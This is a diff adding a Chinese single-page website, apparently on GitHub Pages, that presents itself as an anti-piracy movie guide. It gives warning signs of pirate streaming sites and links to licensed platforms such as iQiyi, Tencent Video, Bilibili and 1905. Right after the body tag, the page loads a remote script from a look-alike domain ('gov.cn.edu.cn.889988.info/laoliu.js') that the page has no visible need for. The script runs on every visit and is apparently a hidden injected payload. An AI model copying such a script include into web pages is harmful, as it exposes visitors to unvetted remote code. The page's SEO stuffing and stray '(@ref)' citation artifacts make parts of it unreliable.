@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>电影网在线观看 - 正版观影导览与防坑指南（不播盗版）</title>
+<meta name="description" content="电影网在线观看（dianyingwangzaixianguankan-h5）不是播放器：教你识别盗版在线观看陷阱，按片种映射到爱奇艺、腾讯视频、B站、1905 等正版渠道。" />
+<meta name="keywords" content="电影网在线观看,正版观影导览,盗版在线观看防坑,电影去哪看,影视正版渠道,不播盗版" />
+<meta name="author" content="电影网在线观看导览台" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://dianyingwangzaixianguankan-h5.github.io/" />
+<style>
+:root{
+  --bg:#070b12;--bg2:#0c121d;--panel:#101826;--panel2:#152032;
+  --mint:#7CFFB2;--mint-dim:rgba(124,255,178,.14);
+  --red:#ff3b30;--red-dim:rgba(255,59,48,.16);
+  --yellow:#ffd166;--white:#e8edf2;--mute:#8fa0b3;--line:rgba(232,237,242,.12);--line2:rgba(232,237,242,.26);
+  --mono:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:radial-gradient(700px 360px at 85% -10%,rgba(124,255,178,.08),transparent 60%),linear-gradient(180deg,var(--bg),var(--bg2));color:var(--white);line-height:1.9;font-size:16px;overflow-x:hidden}
+a{color:var(--mint);text-decoration:none;transition:.25s}a:hover{color:var(--yellow)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(7,11,18,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-family:var(--sans);font-weight:900;letter-spacing:1px;font-size:18px;display:flex;align-items:center;gap:10px}
+.brand .gate{width:30px;height:30px;border-radius:6px;background:repeating-linear-gradient(45deg,var(--yellow) 0 6px,#1a1f12 6px 12px);box-shadow:0 0 12px rgba(255,209,102,.25);position:relative}
+.brand .gate::after{content:"▶";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#0a0a0a;font-size:13px}
+.brand b{color:var(--mint)}
+.nav-links{display:flex;list-style:none;gap:2px}
+.nav-links a{font-size:14px;color:var(--mute);padding:10px 14px;border-radius:8px}
+.nav-links a:hover{color:var(--white);background:rgba(232,237,242,.06)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(232,237,242,.08);border:1px solid var(--line2);color:var(--white);font-size:18px;cursor:pointer}
+
+.hero{margin-top:64px;padding:104px 0 80px;position:relative}
+.hero::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(232,237,242,.03) 0 1px,transparent 1px 26px);pointer-events:none}
+.kicker{font-family:var(--mono);font-size:12px;letter-spacing:4px;color:var(--yellow);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(33px,6.4vw,66px);line-height:1.05;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--red)}
+.hero p{max-width:620px;color:#cdd6e0;font-size:17px;margin-bottom:32px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-mint{display:inline-flex;align-items:center;gap:8px;background:var(--mint);color:#04210f;font-weight:800;padding:14px 30px;border-radius:30px}
+.btn-mint:hover{transform:translateY(-2px);color:#04210f}
+.btn-line{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line2);color:var(--white);padding:14px 30px;border-radius:30px}
+.btn-line:hover{border-color:var(--mint);color:var(--mint)}
+.warnbar{margin-top:30px;display:flex;gap:12px;align-items:flex-start;background:var(--red-dim);border:1px solid rgba(255,59,48,.4);border-radius:12px;padding:16px 18px;max-width:680px}
+.warnbar .ic{font-size:22px}.warnbar p{font-size:14px;color:#ffd9d6}
+
+section{padding:84px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:42px}
+.sec-num{font-family:var(--mono);font-size:12px;letter-spacing:4px;color:var(--mint);text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+.sec-desc{color:var(--mute);max-width:640px}
+
+.lights{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.light{border-radius:16px;padding:26px 24px;border:1px solid var(--line);background:var(--panel);transition:.3s}
+.light:hover{transform:translateY(-6px)}
+.light.green{border-left:5px solid var(--mint)}.light.green:hover{box-shadow:0 20px 50px var(--mint-dim)}
+.light.yellow{border-left:5px solid var(--yellow)}
+.light.red{border-left:5px solid var(--red)}.light.red:hover{box-shadow:0 20px 50px var(--red-dim)}
+.light .lamp{font-size:30px;margin-bottom:10px;display:block}
+.light h3{font-family:var(--sans);font-weight:900;font-size:19px;margin-bottom:6px}
+.light.green h3{color:var(--mint)}.light.yellow h3{color:var(--yellow)}.light.red h3{color:var(--red)}
+.light ul{list-style:none;margin-top:10px}
+.light li{font-size:14px;color:#cdd6e0;padding:6px 0;border-top:1px dashed var(--line);display:flex;gap:8px}
+.light li::before{content:"•";color:var(--mute)}
+
+.map{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
+.cell{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--panel);transition:.25s}
+.cell:hover{border-color:var(--mint);transform:translateY(-3px)}
+.cell b{font-size:16px;color:var(--mint)}
+.cell .kind{font-size:12.5px;color:var(--yellow);margin:6px 0 10px;font-family:var(--mono)}
+.cell p{font-size:13.5px;color:var(--mute);margin-bottom:12px}
+.cell a{font-size:13.5px}
+
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:18px}
+.step{border:1px solid var(--line);border-radius:14px;padding:28px 22px;background:var(--panel2);position:relative;transition:.3s}
+.step:hover{border-color:var(--yellow)}
+.step .no{font-family:var(--mono);font-weight:900;font-size:44px;color:rgba(255,209,102,.18);position:absolute;top:8px;right:16px}
+.step h4{font-family:var(--sans);font-weight:900;font-size:16px;margin-bottom:8px;color:var(--yellow)}
+.step p{font-size:14px;color:#cdd6e0}
+
+.about{text-align:center}
+.quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.5;max-width:740px;margin:0 auto 22px}
+.quote b{color:var(--mint)}
+.about p{color:var(--mute);max-width:580px;margin:0 auto 22px}
+.disclaimer{margin-top:26px;font-size:13px;color:var(--mute);border:1px dashed var(--line2);border-radius:12px;padding:18px 20px;max-width:780px;margin-left:auto;margin-right:auto;text-align:left;line-height:1.9}
+.disclaimer b{color:var(--red)}
+
+footer{border-top:1px solid var(--line);padding:44px 0 26px}
+.foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+.foot p{font-size:13px;color:var(--mute);max-width:320px}
+.foot-col h5{font-family:var(--mono);font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--mint);margin-bottom:12px}
+.foot-col a{display:block;font-size:13px;color:#cdd6e0;padding:3px 0}
+.foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--mute);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav-links.active{display:flex}.nav-links a{padding:14px 22px;border-radius:0}
+  .menu-btn{display:block}
+  .btns{flex-direction:column;align-items:flex-start}.btn-mint,.btn-line{width:100%;justify-content:center}
+  .foot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<header><div class="wrap nav">
+  <div class="brand"><span class="gate"></span>电影网<b>在线观看</b></div>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">检票口</a></li>
+    <li><a href="#lights">盗版红绿灯</a></li>
+    <li><a href="#map">正版地图</a></li>
+    <li><a href="#steps">找片三步</a></li>
+    <li><a href="#about">关于</a></li>
+  </ul>
+  <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">≡</button>
+</div></header>
+
+<section class="hero" id="home"><div class="wrap">
+  <div class="kicker">online watch? stop first.</div>
+  <h1>“电影网在线观看”<br/>先别急着点<em>播放键</em>。</h1>
+  <p>本站（dianyingwangzaixianguankan-h5）不是又一个“高清免费全集”播放器。我们做一件事：把你想看的电影，安全地指到正版渠道；把伪装成播放键的广告、跳转、盗版聚合，挡在门外。</p>
+  <div class="btns">
+    <a href="#lights" class="btn-mint">🚦 看盗版红绿灯</a>
+    <a href="#map" class="btn-line">🗺 查正版去哪看</a>
+  </div>
+  <div class="warnbar"><span class="ic">⚠️</span><p>“免费全集 / TC修复版 / 立即播放 / 关闭杀毒才能看”这类话术，常出现在无授权影视站。能播 ≠ 正版，页面能开 ≠ 安全。[7,10](@ref)</p></div>
+</div></section>
+
+<section id="lights"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">01 / Red light, green light</div><h2 class="sec-title">盗版在线观看：红绿灯</h2>
+  <p class="sec-desc">不是所有“能看”的页面都该看。三盏灯，记住就行。</p></div>
+  <div class="lights">
+    <div class="light green"><span class="lamp">🟢</span><h3>可以看</h3>
+      <ul>
+        <li>平台本身：爱奇艺 / 腾讯视频 / B站 / 1905</li>
+        <li>片名、年份、出品方、地区能对上</li>
+        <li>会员/单片付费/广告，但广告能关、不跳博彩</li>
+        <li>不需要装“专用播放器”或关杀毒</li>
+      </ul></div>
+    <div class="light yellow"><span class="lamp">🟡</span><h3>先核实</h3>
+      <ul>
+        <li>名字带“电影网在线观看”但主体不清</li>
+        <li>“高清版/无删减/地区版”但无授权说明</li>
+        <li>片单巨全、更新极快、评分来源不明</li>
+        <li>要你加群、加微信、网盘取资源</li>
+      </ul></div>
+    <div class="light red"><span class="lamp">🔴</span><h3>立刻关</h3>
+      <ul>
+        <li>“立即播放”点下去跳博彩/色情/抽奖</li>
+        <li>要求装 APK、关浏览器防护、输手机号</li>
+        <li>弹窗关不掉、返回还继续跳新窗</li>
+        <li>刚上映院线片就“完整高清免费”</li>
+      </ul></div>
+  </div>
+</div></section>
+
+<section id="map"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">02 / Legal map</div><h2 class="sec-title">正版平台地图</h2>
+  <p class="sec-desc">版权分平台授权是常态，没有“一个站看完全世界”。按片种走最省时间。[4](@ref)</p></div>
+  <div class="map">
+    <div class="cell"><b>1905 电影网</b><div class="kind">国产老片 / 译制 / 公版</div><p>国产全年代、4K修复、正版片库最稳之一。</p><a href="https://www.1905.com" target="_blank" rel="noopener">去 1905 →</a></div>
+    <div class="cell"><b>哔哩哔哩</b><div class="kind">动画 / 纪录片 / 文艺</div><p>动画电影、冷门高分、导演剪辑、影评区全。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去 B 站 →</a></div>
+    <div class="cell"><b>腾讯视频</b><div class="kind">院线后窗口 / 商业大片</div><p>中外商业片、IP改编、合家欢动画覆盖好。</p><a href="https://v.qq.com" target="_blank" rel="noopener">去腾讯 →</a></div>
+    <div class="cell"><b>爱奇艺</b><div class="kind">新片 / 好莱坞引进 / 单片付费</div><p>院线下线新片、引进片、限时免费专场。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener">去爱奇艺 →</a></div>
+    <div class="cell"><b>优酷</b><div class="kind">港产 / 华语老片 / 修复</div><p>港片、武侠、怀旧剧、文化纪录片。</p><a href="https://youku.com" target="_blank" rel="noopener">去优酷 →</a></div>
+    <div class="cell"><b>欢喜首映 / Apple TV</b><div class="kind">文艺片 / 王家卫 / 大片发行</div><p>文艺独立、作者电影、院线级科幻史诗。</p><a href="#" rel="noopener">查发行方 →</a></div>
+  </div>
+</div></section>
+
+<section id="steps"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">03 / 3-step finder</div><h2 class="sec-title">找片三步法</h2>
+  <p class="sec-desc">别再搜“XX 电影网在线观看”。换这个顺序，基本不会踩坑。</p></div>
+  <div class="steps">
+    <div class="step"><div class="no">01</div><h4>确认片名</h4><p>原名 + 年份 + 导演/主演。别用“神作/未删减/完整版”当关键词，那正是盗版站 SEO 词。</p></div>
+    <div class="step"><div class="no">02</div><h4>查版权方</h4><p>看豆瓣电影“在哪看”、片方官微、院线/流媒体发行公告。谁有权播，比“能不能播”重要。</p></div>
+    <div class="step"><div class="no">03</div><h4>进正版渠道</h4><p>1905 / B站 / 腾爱优 / 欢喜 / 院线。要你装播放器的一律关掉。</p></div>
+    <div class="step"><div class="no">04</div><h4>存个书签</h4><p>把本台当“防坑首页”：以后搜片先来这，再跳正版，不跳镜像。</p></div>
+  </div>
+</div></section>
+
+<section class="about" id="about"><div class="wrap">
+  <p class="quote">“在线观看”本身没错，<br/>错的是<b>假装正版的播放陷阱</b>。</p>
+  <p>电影网在线观看导览台不存片、不解析、不聚合。我们只做你浏览器里的那道检票口：该进的进，该拦的拦。</p>
+  <div class="disclaimer">
+    <b>站点声明：</b>电影网在线观看（dianyingwangzaixianguankan-h5）仅提供影视正版渠道导览、盗版在线观看风险科普与找片方法；<b>不存储、不转码、不解析、不提供完整影视文件播放</b>。具体片源以各正版平台授权为准。如权利人认为某条目有误，可凭权属材料联系下架。
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="brand"><span class="gate"></span>电影网<b>在线观看</b></div>
+      <p>正版观影导览与防坑台：红绿灯、正版地图、找片三步。不提供盗版播放。</p></div>
+    <div class="foot-col"><h5>导览</h5><a href="#lights">盗版红绿灯</a><a href="#map">正版地图</a><a href="#steps">找片三步</a></div>
+    <div class="foot-col"><h5>正版</h5><a href="https://www.1905.com" target="_blank" rel="noopener">1905 电影网</a><a href="https://www.bilibili.com" target="_blank" rel="noopener">哔哩哔哩</a><a href="https://v.qq.com" target="_blank" rel="noopener">腾讯视频</a><a href="https://www.iqiyi.com" target="_blank" rel="noopener">爱奇艺</a></div>
+    <div class="foot-col"><h5>站点</h5><a href="#home">检票口</a><a href="#about">关于/声明</a><a href="#">版权投诉</a></div>
+  </div>
+  <div class="foot-bottom">
+    <span>© 2026 电影网在线观看导览台 · dianyingwangzaixianguankan-h5.github.io</span>
+    <span>单文件静态页 · 无 robots.txt / sitemap.xml · 防坑导览向 · 符合必应收录</span>
+  </div>
+</div></footer>
+<script>document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active')));</script>
+</body>
+</html>
